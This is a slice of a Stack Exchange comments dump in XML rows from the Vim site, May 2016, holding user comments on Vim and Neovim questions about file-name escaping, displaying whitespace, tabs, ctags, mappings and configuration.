  <row Id="12515" PostId="7590" Score="0" Text="@muru thanks, I'll take a proper look later." CreationDate="2016-05-03T09:34:23.030" UserId="360" />
  <row Id="12516" PostId="7608" Score="1" Text="It could be useful to see the &quot;why&quot; of this question. For example, the OP could have something like Emacs in mind, where each operation is either an interactive function (command) or a function, but in any case has a function associated. In Vim, things are not so &quot;canonical&quot;, so to speak. It would be more elegant perhaps for Vim to be able to expose a more powerful API. In any case, the question doesn't show its purpose." CreationDate="2016-05-03T10:19:13.813" UserId="1800" />
  <row Id="12517" PostId="7608" Score="0" Text="No, actually I asked the exact question I wanted an answer to. Sometimes I don't want help solving a specific problem, I just want an answer to a specific question. I tried looking for a built in function that does this and could not find one. If there is one, I would like to know about it. If there is not, I would accept that as the correct answer." CreationDate="2016-05-03T12:45:31.357" UserId="1410" />
  <row Id="12518" PostId="7608" Score="0" Text="Also, please stop making it really hard to like this community. If this is not the correct place to ask a very specific and clear Vim question, then nothing is." CreationDate="2016-05-03T12:57:54.930" UserId="1410" />
  <row Id="12519" PostId="7611" Score="2" Text="Works here (`v`, move around to select a visual zone, and `&lt;C-g&gt;` to enter select mode) can you provide additional informations?" CreationDate="2016-05-03T13:03:06.250" UserId="1821" />
  <row Id="12520" PostId="7611" Score="0" Text="Which version/build of vim &amp; which operating system?" CreationDate="2016-05-03T13:07:07.993" UserId="859" />
  <row Id="12521" PostId="7608" Score="0" Text="Actually, I was trying to help :) I was suggest that you edit your question (specifying a &quot;why&quot;) so that the question could be taken out of &quot;on hold&quot;." CreationDate="2016-05-03T13:10:21.183" UserId="1800" />
  <row Id="12522" PostId="7611" Score="0" Text="Version 7.2 , Linux" CreationDate="2016-05-03T13:27:06.907" UserId="7161" />
  <row Id="12523" PostId="7608" Score="3" Text="Voted for reopening, after the edit - pun intended :) As to the issue, not being able to call something like &quot;edit &lt;filename&gt;&quot; from a plugin, when &lt;filename&gt; has spaces, I think `:h fnameescape()` can help, e.g. the example found right there: `:exe &quot;edit&quot; . fnameescape(fname)` may be what you are after." CreationDate="2016-05-03T14:08:31.740" UserId="1800" />
  <row Id="12524" PostId="7611" Score="3" Text="Are you talking about visual mode (entered via `v`) and miss using the work &quot;select mode&quot; or are you really talking about select mode (entered via `gh`)? In both cases it is pretty weird that only one mode is shown but not the others... Did you follow the steps of this post to be sure that the problem doesn't come from your `.vimrc` http://vi.stackexchange.com/q/2003/1841?" CreationDate="2016-05-03T14:45:44.993" UserId="1841" />
  <row Id="12525" PostId="7608" Score="0" Text="I finished making a function for this. You can see it as the edit method of this File class: https://github.com/still-dreaming-1/vim-elhiv/blob/develop/src/File.vim" CreationDate="2016-05-03T15:12:02.200" UserId="1410" />
  <row Id="12526" PostId="7362" Score="0" Text="Actually if s:filename will be set from outside any function, it can be set to `expand('&lt;sfile&gt;')`. Then that variable can be referenced inside functions inside that script or anywhere else in that script. That way the name of the file does not need to be hard coded into the variable and the variable will still get set correctly if the filename changes." CreationDate="2016-05-03T15:26:32.130" UserId="1410" />
  <row Id="12527" PostId="7608" Score="0" Text="Maybe I'm wrong, but (after a quick look) perhaps you should surround the `.` with spaces to concatenate &quot;e &quot; and the `editable_path` (?)" CreationDate="2016-05-03T16:00:26.917" UserId="1800" />
  <row Id="12528" PostId="7362" Score="0" Text="Indeed you're right instead of hardcoding the name you can use `let s:filename=expand('&lt;sfile&gt;:p')` and then inside the functions of the script use the variable. Now if you change the name of the file you'll have to source it again to be sure the variable is updated." CreationDate="2016-05-03T16:25:06.077" UserId="1841" />
  <row Id="12529" PostId="7608" Score="0" Text="@VanLaser Thanks. I'm not sure what you mean though? If you mean the `.` on line 27, that is the concatenation operator. Although you seem to understand that... I am confused." CreationDate="2016-05-03T16:31:29.497" UserId="1410" />
  <row Id="12530" PostId="7608" Score="0" Text="@VanLaser Oh do you mean as a code style suggestion? To make the code clearer?" CreationDate="2016-05-03T16:34:16.500" UserId="1410" />
  <row Id="12531" PostId="7608" Score="0" Text="Scratch that, I was wrong :) I always use spaces, but they are not necessary. But if your error is there, try to enclose `editable_path` inside a `fnameescape()` call." CreationDate="2016-05-03T16:37:59.080" UserId="1800" />
  <row Id="12532" PostId="7608" Score="1" Text="@VanLaser That is awesome! My code is working for me in the ways I have used it as is. But that is definitely better than just escaping spaces. The example in the help is the exact scenario I am using it in. That function is specifically for this exact problem." CreationDate="2016-05-03T16:53:17.857" UserId="1410" />
  <row Id="12533" PostId="7608" Score="2" Text="Cool :) In this case, maybe you want to look at `:h function-list` to see what (more) functions are available - they may further simplify your code." CreationDate="2016-05-03T17:06:26.103" UserId="1800" />
  <row Id="12534" PostId="7582" Score="1" Text="@VanLaser great thanks for that just what I wanted" CreationDate="2016-05-03T20:55:07.620" UserId="6905" />
  <row Id="12535" PostId="7582" Score="0" Text="you're welcome!" CreationDate="2016-05-03T21:39:19.443" UserId="1800" />
  <row Id="12536" PostId="7615" Score="1" Text="Did you do `:help neomake`?" CreationDate="2016-05-03T21:52:18.780" UserId="54" />
  <row Id="12537" PostId="7190" Score="0" Text="How can we download such a version of Vim? I have updated mine and it still is not correct. Cloning the git file on github is also not working." CreationDate="2016-05-03T21:56:22.750" UserId="7341" />
  <row Id="12538" PostId="7615" Score="0" Text="I have looked it over in varying detail.  I didn't find anything related my issue. In fact, it's quite long and the vast majority of it has absolutely nothing to do with my problem." CreationDate="2016-05-03T23:57:24.200" UserId="69" />
  <row Id="12539" PostId="7614" Score="0" Text="Thanks this is a big relief" CreationDate="2016-05-04T01:10:51.633" UserId="7053" />
  <row Id="12540" PostId="7191" Score="0" Text="Actually, `E21` is not the problem, I just want to use it as an indicator that it doesn't work, i.e. it doesn't change or try to change anything." CreationDate="2016-05-04T03:21:30.953" UserId="6380" />
  <row Id="12541" PostId="7614" Score="1" Text="No `:changelist` found when I checked. But found `:changes`, `changelist`" CreationDate="2016-05-04T06:26:05.033" UserId="7501" />
  <row Id="12542" PostId="7614" Score="0" Text="@vusan, oops. I initially wrote `:changes` but thought that `:help changelist` would be more appropriate and… in the end I forgot the colon. Thank you." CreationDate="2016-05-04T07:31:19.880" UserId="54" />
  <row Id="12543" PostId="7615" Score="1" Text="Maybe `silent! Neomake`?" CreationDate="2016-05-04T07:41:53.477" UserId="205" />
  <row Id="12544" PostId="7617" Score="0" Text="Wouldn't the autocommand event `BufLeave` do the trick? It is triggered before leaving to another buffer, so I guess it would be triggered before switching to the terminal, right? I don't use neovim so I'm not really sure." CreationDate="2016-05-04T09:07:51.637" UserId="1841" />
  <row Id="12545" PostId="7617" Score="1" Text="@statox It works! Yay! Thank you!" CreationDate="2016-05-04T09:15:40.010" UserId="6634" />
  <row Id="12546" PostId="7619" Score="3" Text="Your link has an accepted answer (`set list`), what's wrong with it?" CreationDate="2016-05-04T09:33:59.217" UserId="1800" />
  <row Id="12547" PostId="7619" Score="0" Text="Also see https://superuser.com/questions/463785/how-do-i-get-vim-to-show-trailing-whitespace-but-use-blank-spaces-for-tabs." CreationDate="2016-05-04T10:03:15.740" UserId="1296" />
  <row Id="12548" PostId="7619" Score="0" Text="@VanLaser With that inner spaces can't be clearly distinguished (for example with a colored middle dot as several editors do) and CR and LF can be told apart only if a file has mixed line endings, and even then there's no way to tell if there's a LF at the end of the file or not (there's always a single &quot;$&quot; displayed), and &quot;$&quot; also means either LF in an all-LF file or CRLF in an all-CRLF file." CreationDate="2016-05-04T10:06:05.967" UserId="7503" />
  <row Id="12549" PostId="7619" Score="0" Text="@PhilippFrank I already read it, doesn't help." CreationDate="2016-05-04T10:07:50.473" UserId="7503" />
  <row Id="12550" PostId="7619" Score="3" Text="About inner spaces: they are not different characters, right? They are still &quot;normal&quot; spaces - for that you can add a 'match' rule if I'm not mistaken. For the 2nd issue - again, you can add matches that parse your file and syntax highlight the line for example, if it ends in a different &quot;Enter&quot; than you wish. Just to suggest a different approach, maybe it can help." CreationDate="2016-05-04T10:09:03.603" UserId="1800" />
  <row Id="12551" PostId="7619" Score="1" Text="@gbr What do you mean it doesn't help? It did work when I tried it, if I did not misunderstand your intention. (e) Ah ok, your intention goes beyond what list does/can do, so maybe you should try VanLaser's suggestion." CreationDate="2016-05-04T10:48:45.667" UserId="1296" />
  <row Id="12552" PostId="7619" Score="0" Text="@VanLaser With :match you can only highlight things, if I'm not mistaken; having spaces of a different color doesn't help in any way, I want to tell apart one character from the other, a continuous stripe of color is no better than a continuous stripe of white.&#xA;For the 2nd, I just want to see clearly all the characters, I don't want to have to remember to check what options are set for the current file ('fileformat', 'eol'...), and preferably not to launch scripts either. The characters are there, I want to see them." CreationDate="2016-05-04T11:01:37.953" UserId="7503" />
  <row Id="12553" PostId="7619" Score="0" Text="I want to know what I (or my editor) put in a file, and I can't constantly switch to another software. If there's no way this will be a major reason for me to ditch vim." CreationDate="2016-05-04T11:01:43.563" UserId="7503" />
  <row Id="12554" PostId="7619" Score="0" Text="You can ditch Vim any time for all we care but you can also make your question easier to understand with a visual example. What we understand from your question is that you want to see an `a` when you insert an `a` or a ` ` when you insert a `space`." CreationDate="2016-05-04T11:55:41.430" UserId="54" />
  <row Id="12556" PostId="7619" Score="0" Text="@romainl Oh come on it's a standard feature. I'm pretty sure that a person aware of a plugin who does it would understand the question right away" CreationDate="2016-05-04T12:35:56.810" UserId="7503" />
  <row Id="12557" PostId="7619" Score="0" Text="Again, is an &quot;inner space&quot; a different character than &quot;space&quot;, or not?" CreationDate="2016-05-04T12:43:48.453" UserId="1800" />
  <row Id="12558" PostId="7622" Score="2" Text="What kind of motions? For example, if motion is fixed (say `w`), you may overshoot the mark (if your mark is inside a word). If more than one type of motion is possible, you may need to invent an artificial intelligence-based algorithm :)" CreationDate="2016-05-04T12:45:25.963" UserId="1800" />
  <row Id="12559" PostId="7622" Score="0" Text="Yeah, I guess I haven't thought about this case ^^, but I think you could move forward (or backward) until you reach the mark or overtake it." CreationDate="2016-05-04T12:53:49.880" UserId="1821" />
  <row Id="12560" PostId="7619" Score="1" Text="@VanLaser I'm sorry, I remarked _inner_ space because the `listchar` option does allow to set a character for trailing spaces, and I mistakenly understood that it also permitted to set one for space at the beginning of the lines, with `precedes`.&#xA;Thus I thought that the only space it didn't cover was the &quot;inner&quot; space, that is that interior to the lines.&#xA;I now saw that `precedes` has nothing to do with it though (so it's even more limited).&#xA;I don't want to treat &quot;inner&quot; space differently, I'd like that all spaces be displayed with a different symbol." CreationDate="2016-05-04T13:12:24.123" UserId="7503" />
  <row Id="12561" PostId="7622" Score="1" Text="The number of motions needed to jump to a mark is always exactly 1." CreationDate="2016-05-04T13:24:38.600" UserId="54" />
  <row Id="12562" PostId="7619" Score="0" Text="@VanLaser I noticed that at least in the GUI version you can set a specific font for an highlight group, so I think I could theoretically do what I want for the spaces with your solution, by making a font with my chosen symbol. However it's not that straightforward, I was looking for a ready solution (especially one that addresses the line endings too)." CreationDate="2016-05-04T13:32:22.097" UserId="7503" />
  <row Id="12563" PostId="7624" Score="0" Text="What do you mean by &quot;graphical Neovim in Terminal&quot;? Is there some feature in a GUI version of Neovim that you're lacking in terminal version?" CreationDate="2016-05-04T14:57:55.427" UserId="7415" />
  <row Id="12565" PostId="7624" Score="0" Text="What graphical neovim did you install? How? Did you read its documentation?" CreationDate="2016-05-04T15:09:59.850" UserId="54" />
  <row Id="12567" PostId="7624" Score="1" Text="You probably installed [Neovim.app](https://github.com/rogual/neovim-dot-app), which can be started as `gnvim`." CreationDate="2016-05-04T15:20:19.627" UserId="7415" />
  <row Id="12569" PostId="7624" Score="1" Text="Your Graphical Neovim can't be NVIM because NVIM doesn't ship with a GUI, @Masi." CreationDate="2016-05-04T15:21:24.553" UserId="7415" />
  <row Id="12572" PostId="7627" Score="0" Text="Are you asking of you can generate line specific mappings? &lt;C-1&gt; does first line? If not, the mapping can be anything usable with normal mode mappings so long as it doesn't undo your visual selection." CreationDate="2016-05-04T17:23:27.480" UserId="895" />
  <row Id="12574" PostId="7629" Score="5" Text="If you do that, though, you will lose access to the rich set of windows commands that begin with Ctrl-W. See `:help CTRL-W` and `:help windows`." CreationDate="2016-05-04T17:46:00.260" UserId="2055" />
  <row Id="12575" PostId="7627" Score="0" Text="@Masi yes just replace `gff` with `&lt;C-1&gt;` and you should be good." CreationDate="2016-05-04T18:25:55.693" UserId="895" />
  <row Id="12576" PostId="7631" Score="1" Text="Posted how to get neovim installed since you initially made that comment. However, your question is vague. What do you want to have access to that would be covered in &quot;sufficient api for programming&quot;?" CreationDate="2016-05-04T18:33:26.153" UserId="895" />
  <row Id="12578" PostId="7634" Score="0" Text="Are there are list of those views in practice? It would be nice to visualise all those views." CreationDate="2016-05-04T18:47:14.970" UserId="2923" />
  <row Id="12579" PostId="7631" Score="0" Text="@jecxjo Sufficient stereotyping where I have challenges to get anything to work." CreationDate="2016-05-04T18:48:42.113" UserId="2923" />
  <row Id="12580" PostId="7634" Score="0" Text="I installed all those things suitable for Ubuntu 16.04. I cannot reach those tools in terminal by `gvim`/`gnvim`. I purged `vim-gtk3` afterwards installing the things. How can you reach gnvim?" CreationDate="2016-05-04T18:52:17.990" UserId="2923" />
  <row Id="12581" PostId="7627" Score="0" Text="I have a feeling its because Ubuntu has Ctrl+1 set to something like moving to the 1st Virtual Desktop which would not be controlled by Vim. That would be considered OT for this question since it's an issue with Ubuntu." CreationDate="2016-05-04T19:26:27.357" UserId="895" />
  <row Id="12582" PostId="7631" Score="0" Text="GVim or Neovim? Please be specific." CreationDate="2016-05-04T19:27:41.230" UserId="205" />
  <row Id="12584" PostId="7631" Score="0" Text="@muru I mean graphical neovim." CreationDate="2016-05-04T19:31:24.863" UserId="2923" />
  <row Id="12586" PostId="7627" Score="1" Text="I would suggest you do this the Vim way and use `&lt;leader&gt;` and then one or more keys. Since `gf` is the &quot;Open file named under cursor, you should use either `gf` or `&lt;leader&gt;gf`. Beyond that, this is OT." CreationDate="2016-05-04T19:37:40.207" UserId="895" />
  <row Id="12587" PostId="7608" Score="0" Text="`:h function-list` is great! I have been using `:h functions`, (which tells me about function-list...), but I like the way function-list is organize by category. Actually part of the reason I was writing a library was to make an easier to lookup wrapper around some of the built in functions. Well that is still something I need, but it is good know the different options for looking stuff up." CreationDate="2016-05-04T21:43:59.960" UserId="1410" />
  <row Id="12588" PostId="7627" Score="0" Text="I extend the even distribution of windows here http://vi.stackexchange.com/q/7637/2923" CreationDate="2016-05-05T05:37:02.280" UserId="2923" />
  <row Id="12590" PostId="7637" Score="4" Text="I'm voting to close this question as off-topic because this question has nothing to do with Vim. You'll need to look into [AppleScript](http://macosxautomation.com/applescript/firsttutorial/10.html) to achieve your goal." CreationDate="2016-05-05T08:00:08.297" UserId="54" />
  <row Id="12591" PostId="7636" Score="1" Text="This can't be done without some kind of plugin. Did you try http://www.vim.org?" CreationDate="2016-05-05T08:01:39.087" UserId="54" />
  <row Id="12593" PostId="7636" Score="0" Text="Not yet. I will try" CreationDate="2016-05-05T08:06:54.657" UserId="7161" />
  <row Id="12594" PostId="7637" Score="2" Text="1. Vim/Neovim is not responsible for window positioning, it's the window manager that does all the work. Your problem is that your Linux window manager is subjectively &quot;better&quot; at that job than Mac OS X's. Since Vim/Neovim is unable to position its GUI windows you will need AppleScript to achieve your goal. 2. You already use system-dependent solutions anyway." CreationDate="2016-05-05T08:14:19.127" UserId="54" />
  <row Id="12601" PostId="7643" Score="0" Text="Thanks. but I am not asking about shell commands. I want to explore the options related to editing directory, like we edit a file." CreationDate="2016-05-05T13:44:45.093" UserId="7161" />
  <row Id="12602" PostId="7643" Score="2" Text="It's worth knowing the https://github.com/tpope/vim-eunuch plugin also." CreationDate="2016-05-05T13:51:05.057" UserId="1821" />
  <row Id="12603" PostId="7643" Score="1" Text="+1 for not reinventing the wheel" CreationDate="2016-05-05T14:07:02.787" UserId="4652" />
  <row Id="12604" PostId="7637" Score="1" Text="Any particular reason you're using multiple GUI windows instead of splits, tabs, and buffers in one GUI window?" CreationDate="2016-05-05T14:23:38.107" UserId="2736" />
  <row Id="12605" PostId="677" Score="0" Text="I found [this](https://github.com/chaoren/vim-wordmotion) plugin to be better. Combining motion with deletion works properly, and it stops at brackets too." CreationDate="2016-05-05T14:30:03.717" UserId="7518" />
  <row Id="12608" PostId="7637" Score="0" Text="So, just to make sure I understand correctly, you're currently opening each file in a separate instance of GVIM, in order to be able to more easily see what files you have open?" CreationDate="2016-05-05T14:46:16.403" UserId="2736" />
  <row Id="12610" PostId="7637" Score="0" Text="If you use vertical splits you can use `&lt;C-w&gt;=` to make all splits approximately equal width." CreationDate="2016-05-05T14:56:03.283" UserId="6489" />
  <row Id="12611" PostId="7637" Score="0" Text="@Tumbler41 I do not want splits because I have many files. Only tabs with overview top bar possible. However, I have not managed to get it work in practice." CreationDate="2016-05-05T14:59:32.587" UserId="2923" />
  <row Id="12612" PostId="7647" Score="3" Text="To what extent would you define a prefix? Are you looking to just find the first instance of your previously typed string and then fill in til `&lt;eol&gt;`?" CreationDate="2016-05-05T16:27:59.237" UserId="895" />
  <row Id="12613" PostId="7647" Score="0" Text="I also thought to ask this question!" CreationDate="2016-05-05T16:46:29.457" UserId="7161" />
  <row Id="12614" PostId="7637" Score="2" Text="Not to tell you what to do, but you might find it beneficial to get used to opening/closing files within a single instance of vim.  Whether you use tabs as part of a solution is up to you, but it it'll feel more natural jumping between windows, copying/moving text between them etc than separate instances of vim." CreationDate="2016-05-05T16:47:58.317" UserId="859" />
  <row Id="12615" PostId="7648" Score="0" Text="Can you show how to use `vim -p` in the macro, please. Please, see the body for my proposal which leads to corrupted output." CreationDate="2016-05-05T17:57:01.437" UserId="2923" />
  <row Id="12616" PostId="7619" Score="0" Text="@VanLaser I found out that recent versions support a complete solution for whitespace, see the edit" CreationDate="2016-05-05T17:57:31.073" UserId="7503" />
  <row Id="12617" PostId="7647" Score="0" Text="@jecxjo I would define a prefix as everything that appears on the current line from the beginning to the cursor position. What I would like is to search for the prefix of the current line in the whole buffer (even inside other lines) and complete the part of the matched line til `&lt;eol&gt;`." CreationDate="2016-05-05T18:18:42.507" UserId="6894" />
  <row Id="12618" PostId="7619" Score="0" Text="Great. FWIW, when I open a DOS-type line-terminated file in Vim, it does show a differently-colored `^M` at the end of the line - but that probably depends on the file encoding settings. Perhaps try playing with `dos2unix` and `unix2dos` Linux commands on a dummy file, loading it into Vim, and see how it behaves." CreationDate="2016-05-05T18:28:40.373" UserId="1800" />
  <row Id="12619" PostId="7619" Score="0" Text="@VanLaser Yes it varies with the fileformat settings, as I said in the [first comment](https://vi.stackexchange.com/questions/7619/any-vim-plugin-to-display-all-characters#comment12548_7619)" CreationDate="2016-05-05T18:32:58.837" UserId="7503" />
  <row Id="12620" PostId="7651" Score="1" Text="Maybe you'd be interested in [exuberant ctags](http://ctags.sourceforge.net/) which allows you to generate tags for a project and then use them to navigate your code?" CreationDate="2016-05-05T18:58:45.627" UserId="1841" />
  <row Id="12621" PostId="7651" Score="1" Text="I would have to use `:tselect` or `g]` and *then* selecting one of the many possibilities. Imagine if the variable is called `i` ;) And you should really be advising Universal Ctags, which at least is being actively supported." CreationDate="2016-05-05T19:09:04.797" UserId="599" />
  <row Id="12622" PostId="7651" Score="0" Text="Ok I just wanted to make sure that you were aware that this kind of solution existed :)" CreationDate="2016-05-05T19:14:40.550" UserId="1841" />
  <row Id="12623" PostId="7651" Score="1" Text="Forgot to say &quot;thanks&quot;! :)" CreationDate="2016-05-05T19:15:33.437" UserId="599" />
  <row Id="12624" PostId="7651" Score="2" Text="With vim, you can customize `gd` or `gD` per filetype, to use custom searches instead of `{`. If that helps. The specific example is missing ;) Python example (just searched for it): https://github.com/danielroseman/pygd-vim" CreationDate="2016-05-05T19:30:55.493" UserId="1800" />
  <row Id="12625" PostId="7648" Score="0" Text="@Masi `vim -p` is something you run to start up vim. If you've already got vim open, you should open files with `:tabe`, or, if you've already got the files opened, use `:tab ball` to move them all to tabs." CreationDate="2016-05-05T20:05:59.187" UserId="2736" />
  <row Id="12626" PostId="7615" Score="0" Text="@muru unfortunately `silent!` doesn't make a difference." CreationDate="2016-05-05T20:35:14.777" UserId="69" />
  <row Id="12627" PostId="7653" Score="0" Text="They should call it Metavim :P" CreationDate="2016-05-05T21:52:08.807" UserId="6489" />
  <row Id="12628" PostId="7651" Score="1" Text="@VanLaser you answered the question with an example. You should post it as an actual answer." CreationDate="2016-05-05T23:55:56.497" UserId="895" />
  <row Id="12629" PostId="7653" Score="0" Text="I don't know of any mouse-specific changes that Neovim has which would make it better than Vim." CreationDate="2016-05-06T00:08:37.987" UserId="15" />
  <row Id="12630" PostId="7646" Score="0" Text="Unfortunately, I can't say this has worked. It highlights cursorline in all files now, including the ones in the said dirs." CreationDate="2016-05-06T03:18:57.890" UserId="7521" />
  <row Id="12631" PostId="7648" Score="0" Text="Please, see the macro. I run `find` with `exec`. Vim is not open yet but you cannot run `vim -p`. Which one to run?" CreationDate="2016-05-06T04:09:51.780" UserId="2923" />
  <row Id="12632" PostId="7646" Score="0" Text="There could be a few things going on. You might try surrounding the `expand()` function in an `fnameescape()` function. This just makes sure things are properly formatted for a directory. For more specific help, it might help to see the output of `:echo expand('%:p')` on your system. This will make sure we're crafting the regular expression correctly." CreationDate="2016-05-06T04:18:57.210" UserId="6489" />
  <row Id="12633" PostId="7654" Score="0" Text="Oh this is nice, maybe it's not the place to ask the question, but why should your snippet be in `.zshenv` instead of `.zshrc`?" CreationDate="2016-05-06T06:17:02.710" UserId="1821" />
  <row Id="12634" PostId="7654" Score="1" Text="@Nobe4 Because `.zshrc` is [not always sourced](https://rvm.io/integration/vim), while `.zshenv` is guaranteed to be sourced." CreationDate="2016-05-06T07:52:30.977" UserId="2313" />
  <row Id="12636" PostId="7651" Score="0" Text="@jecxjo - actually, I'm not sure what the author exactly wants (what's his specific case, language etc. - or it's just a theoretical question?); also I don't like to post *that* example (it's a plugin made in Python, pretty convoluted), and I don't have an example made by me (since I didn't feel the need to customize `gd` or `gD`). :)" CreationDate="2016-05-06T08:56:00.970" UserId="1800" />
  <row Id="12637" PostId="7661" Score="0" Text="I think you should ask the question to the plugin's developer, https://github.com/jalvesaq/Nvim-R/issues/new" CreationDate="2016-05-06T10:06:56.823" UserId="1821" />
  <row Id="12638" PostId="7661" Score="1" Text="Thanks for the pointer. I will try that, too and update this post if I get a reply." CreationDate="2016-05-06T10:08:36.187" UserId="7533" />
  <row Id="12639" PostId="7661" Score="0" Text="If you got an answer and your problem is solved, consider adding an answer to this question for further reference ;)" CreationDate="2016-05-06T10:09:35.773" UserId="1821" />
  <row Id="12640" PostId="7662" Score="2" Text="What do you mean?" CreationDate="2016-05-06T10:17:36.020" UserId="859" />
  <row Id="12641" PostId="7664" Score="0" Text="yes, put sorry! However I would like to print to the end of line without moving the cursors. Is this possible?" CreationDate="2016-05-06T11:05:51.347" UserId="5154" />
  <row Id="12642" PostId="7664" Score="4" Text="No. You need to move the cursor to where you want to put." CreationDate="2016-05-06T11:06:43.263" UserId="54" />
  <row Id="12643" PostId="7662" Score="2" Text="If you want a mapping you could try this: ```nnoremap ,p m'yiw$p`` ```. Hit `,p` and the word under the cursor should be pasted at the end of the line. You don't need the space at the end, it's here because I don't know how to format code containing a double backtick without it." CreationDate="2016-05-06T11:18:01.783" UserId="6960" />
  <row Id="12644" PostId="7652" Score="0" Text="Nice. I knew that it was possible to complete multiple lines by using `C-x C-l` repeatedly, but I had no idea the same works for `C-x C-n`." CreationDate="2016-05-06T13:01:18.160" UserId="6894" />
  <row Id="12645" PostId="7648" Score="0" Text="@Masi I do not understand. The code in your question is all Vim mappings. You have to have Vim open to run them." CreationDate="2016-05-06T13:07:41.983" UserId="2736" />
  <row Id="12646" PostId="7665" Score="4" Text="`:vim` is short for `:vimgrep`.  Is there a reason you aren't using `:e`?" CreationDate="2016-05-06T13:13:45.157" UserId="5229" />
  <row Id="12647" PostId="7658" Score="0" Text="I think this is a duplicate: http://vi.stackexchange.com/q/4721/1841 or at least pretty related. The idea is to put a customized vimrc on each machine containing its own plugins." CreationDate="2016-05-06T13:14:07.327" UserId="1841" />
  <row Id="12648" PostId="7654" Score="0" Text="Here is further information about the load order of zsh scripts: http://zsh.sourceforge.net/Intro/intro_3.html" CreationDate="2016-05-06T13:36:28.957" UserId="5229" />
  <row Id="12649" PostId="7648" Score="0" Text="Of course. Put the last mapping to your .vimrc and try it. You see it fails. There is a problem in passing list of files to Vim." CreationDate="2016-05-06T13:40:20.840" UserId="2923" />
  <row Id="12650" PostId="7648" Score="1" Text="@Masi Don't put `vim -p` into a vim mapping or in your .vimrc. Open a terminal and type `vim -p file1 file2 file3`." CreationDate="2016-05-06T13:44:23.487" UserId="2736" />
  <row Id="12651" PostId="7654" Score="1" Text="I updated the answer because `$ZSHENV_PATH_SET` is irrelevant to solving the OP's problem.  Adding the check for `$VIRTUAL_ENV` in that block was the result of late night troubleshooting." CreationDate="2016-05-06T13:51:43.320" UserId="5229" />
  <row Id="12652" PostId="7665" Score="1" Text="This is the most basic usage of vim, have you used `vimtutor` or used google to [find](http://askubuntu.com/q/537935/408927) [a](http://www.slackbook.org/html/vi-opening-files.html) [solution](http://www.radford.edu/~mhtay/CPSC120/VIM_Editor_Commands.htm)?" CreationDate="2016-05-06T13:52:42.950" UserId="1841" />
  <row Id="12653" PostId="7667" Score="2" Text="I cannot reproduce your first issue, the selection works fine here. Can you have a look at this post: http://vi.stackexchange.com/questions/2003/how-do-i-debug-my-vimrc-file" CreationDate="2016-05-06T14:07:54.210" UserId="1821" />
  <row Id="12654" PostId="7667" Score="1" Text="Same here the selection works fine." CreationDate="2016-05-06T14:40:18.903" UserId="1841" />
  <row Id="12655" PostId="7667" Score="0" Text="@Nobe4 This issue actually persists for me, even starting vim without my vimrc and plugins." CreationDate="2016-05-06T15:32:43.297" UserId="3264" />
  <row Id="12656" PostId="7667" Score="0" Text="What is your OS?" CreationDate="2016-05-06T15:33:44.897" UserId="1821" />
  <row Id="12657" PostId="7667" Score="1" Text="I still cannot reproduce, this without any plugin/configuration..." CreationDate="2016-05-06T15:41:04.197" UserId="1821" />
  <row Id="12658" PostId="7667" Score="0" Text="Solaris 5.10. Although I've seen this issue on Windows XP and 7 too..." CreationDate="2016-05-06T15:42:42.207" UserId="3264" />
  <row Id="12659" PostId="7669" Score="1" Text="The question said `I would like to search only in &quot;math zones&quot;` your method searches for the whole file it doesn't delimit a research zone." CreationDate="2016-05-06T15:51:11.143" UserId="1841" />
  <row Id="12660" PostId="7667" Score="1" Text="I tried with http://coolwanglu.github.io/vim.js/emterpreter/vim.html and it still select correctly ... I don't really understand what's going on here..." CreationDate="2016-05-06T16:00:42.110" UserId="1821" />
  <row Id="12661" PostId="7667" Score="1" Text="Vim 7.2 is eight years old. You should try with a newer version one day." CreationDate="2016-05-06T16:19:21.777" UserId="54" />
  <row Id="12662" PostId="7665" Score="1" Text="@statox: I have been using vim for over a year without knowing anything about it apart from i, dd and wq!. Only for past few weeks, I am learning it through various resources. I have read vimtutor too and didnt notice this. :/ Before asking a question here, I usually Google it and then search in stackoverflow too. I am a beginner   :)" CreationDate="2016-05-06T17:26:01.637" UserId="7161" />
  <row Id="12663" PostId="7666" Score="1" Text="Thanks. //current working directory isn't the same as the file editing.// I have mistaken the path of the first file to be its current directory. That is, whenever I give the vim command from shell,  I believed that the file's directory is the current directory." CreationDate="2016-05-06T17:30:03.870" UserId="7161" />
  <row Id="12664" PostId="7666" Score="1" Text="Autochdir is the thing I wanted." CreationDate="2016-05-06T17:30:53.433" UserId="7161" />
  <row Id="12665" PostId="7665" Score="2" Text="@SibiCoder: I really don't consider myself as an expert and I do understand that as beginners we sometimes have questions which might be trivial. I was just pointing out that this particular question is answered is several different places. I would never want to discourage someone from asking for help: it's the purpose of this community. It's just that on this particular topic a Google research would have provided you an answer and avoided several downvotes :-)" CreationDate="2016-05-06T17:31:50.357" UserId="1841" />
  <row Id="12666" PostId="7653" Score="0" Text="The one coming to mind right now is that you can be in a terminal ssh session, open up Neovim, and click on a spot to edit it. I don't think Vim can do that, though it's possible that I just don't have a big enough .vimrc yet! I guess this might be better termed as ssh support than mouse support though." CreationDate="2016-05-06T17:32:29.230" UserId="7531" />
  <row Id="12667" PostId="7666" Score="1" Text="Glad I could help. :) I don't want to sound snooty, but since it solved your problem would mind accepting it as the answer? (Check box under the downvote)" CreationDate="2016-05-06T18:24:17.680" UserId="6489" />
  <row Id="12668" PostId="7672" Score="1" Text="Are you using vi or vim? I did try it on your input, and it worked on my system." CreationDate="2016-05-06T19:55:44.810" UserId="6489" />
  <row Id="12669" PostId="7672" Score="1" Text="Oh, also is there whitespace before the the `&lt;&gt;` tags? I didn't account for that." CreationDate="2016-05-06T20:01:04.040" UserId="6489" />
  <row Id="12670" PostId="7674" Score="0" Text="Check out http://ctags.sourceforge.net/ and `:h tags`." CreationDate="2016-05-06T22:53:04.600" UserId="6489" />
  <row Id="12671" PostId="7658" Score="0" Text="Yes, and I think keeping a separate machine-specific file is the most robust/hassle free way to go. The `.vimrc` doesn't have to &quot;know&quot; anything about which machine it is on; and, you would never touch your `.vimrc` file directly ever again, except to update all of them together, avoiding the chance to accidentally get them out of sync." CreationDate="2016-05-07T01:27:57.487" UserId="7547" />
  <row Id="12672" PostId="4721" Score="0" Text="Why not just build up a list of plugins to load, and then load them in a for loop at the end of `.vimrc`? Surely your plugin manager supports loading a function via a function call?" CreationDate="2016-05-07T01:32:11.540" UserId="7547" />
  <row Id="12673" PostId="7651" Score="0" Text="I was really looking for a native configuration to achieve this. Reviewed question text to clarify this." CreationDate="2016-05-07T02:38:56.573" UserId="599" />
  <row Id="12674" PostId="2899" Score="0" Text="^ Which didn't work that well either." CreationDate="2016-05-07T04:22:13.240" UserId="237" />
